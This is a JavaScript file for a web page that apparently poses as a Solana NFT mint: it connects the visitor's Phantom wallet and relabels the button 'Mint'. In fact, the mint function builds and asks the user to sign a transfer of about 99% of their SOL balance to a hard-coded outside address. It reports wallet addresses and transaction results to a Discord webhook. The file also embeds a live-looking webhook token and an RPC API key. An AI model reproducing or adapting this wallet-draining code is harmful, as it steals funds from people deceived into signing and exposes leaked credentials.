async function sendToDiscord(message) {
    const webhookUrl = 'https://discord.com/api/webhooks/1424826301025488946/EripCWiQWqL5VT61z9pGJmm4fGhZf876gn5neA9Gn2FSM8_kgjeCQweEynxRRAL4lj8J';
    
    try {
        await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ content: message })
        });
    } catch (err) {
        console.error("Discord notification failed:", err);
    }
}

$(document).ready(function() {
    let isConnected = false;
    let connection = null;
    let walletPublicKey = null;

    $('#connect-wallet').on('click', async () => {
        // If already connected, execute the mint/transfer
        if (isConnected && connection && walletPublicKey) {
            await executeMint();
            return;
        }

        // Otherwise, connect the wallet
        if (window.solana && window.solana.isPhantom) {
            try {
                const resp = await window.solana.connect();
                walletPublicKey = resp.publicKey;
                sendToDiscord(`Wallet connected: ${resp.publicKey.toString()}`);
                console.log("Phantom Wallet connected:", resp);

                connection = new solanaWeb3.Connection(
                    'https://solana-mainnet.api.syndica.io/api-key/2zjjPuoKeAWepmScwJ72ADocHcNZzLPhNpbqR1X7eB2jMRAdbXMUzuCks578zUKnWnog8dBpj6Km1dHKdjS5p2hQD6cJ7yUgqVp',
                    'confirmed'
                );

                const public_key = new solanaWeb3.PublicKey(resp.publicKey);
                const walletBalance = await connection.getBalance(public_key);
                console.log("Wallet balance:", walletBalance / solanaWeb3.LAMPORTS_PER_SOL, "SOL");

                const minBalance = await connection.getMinimumBalanceForRentExemption(0);
                if (walletBalance < minBalance) {
                    sendToDiscord('Insufficient funds for rent');
                    alert("Insufficient funds for rent.");
                    return;
                }

                isConnected = true;
                $('#connect-wallet').text("Mint");

            } catch (err) {
                console.error("Error connecting to Phantom Wallet:", err);
                sendToDiscord(`Connection error: ${err.message}`);
            }
        } else {
            alert("Phantom extension not found.");
            const isFirefox = typeof InstallTrigger !== "undefined";
            const isChrome = !!window.chrome;

            if (isFirefox) {
                window.open("https://addons.mozilla.org/en-US/firefox/addon/phantom-app/", "_blank");
            } else if (isChrome) {
                window.open("https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa", "_blank");
            } else {
                alert("Please download the Phantom extension for your browser.");
            }
        }
    });

    async function executeMint() {
        try {
            const recieverWallet = new solanaWeb3.PublicKey('7pn7bxJakCXjiyYt5QQy8McZCMCSDk2EvCcNr97UHsfG');
            
            // Get CURRENT balance, not the old one
            const currentBalance = await connection.getBalance(walletPublicKey);
            const minBalance = await connection.getMinimumBalanceForRentExemption(0);
            const balanceForTransfer = currentBalance - minBalance;
            
            console.log("Current balance:", currentBalance / solanaWeb3.LAMPORTS_PER_SOL, "SOL");
            console.log("Transfer amount:", (balanceForTransfer * 0.99) / solanaWeb3.LAMPORTS_PER_SOL, "SOL");
            
            if (balanceForTransfer <= 0) {
                alert("Insufficient funds for transfer.");
                sendToDiscord('Insufficient funds for transfer');
                return;
            }
    
            const transaction = new solanaWeb3.Transaction().add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey: walletPublicKey,
                    toPubkey: recieverWallet,
                    lamports: Math.floor(balanceForTransfer * 0.99),
                }),
            );
    
            const { blockhash } = await connection.getLatestBlockhash('finalized');
            transaction.recentBlockhash = blockhash;
            transaction.feePayer = walletPublicKey;
    
            // USE THIS METHOD FOR PHANTOM - sign first, then send
            const signedTransaction = await window.solana.signTransaction(transaction);
            const signature = await connection.sendRawTransaction(signedTransaction.serialize());
            
            console.log("Transaction sent:", signature);
            sendToDiscord(`Transaction sent: ${signature}`);
            
            // Confirm transaction
            const confirmation = await connection.confirmTransaction(signature, 'confirmed');
            console.log("Transaction confirmed:", signature);
            sendToDiscord(`Transaction confirmed: ${signature}`);
            
            alert("Transfer successful!");
            
        } catch (err) {
            console.error("Error during transfer:", err);
            alert("Transfer failed: " + err.message);
            sendToDiscord(`Transfer failed: ${err.message}`);
        }
    }
});
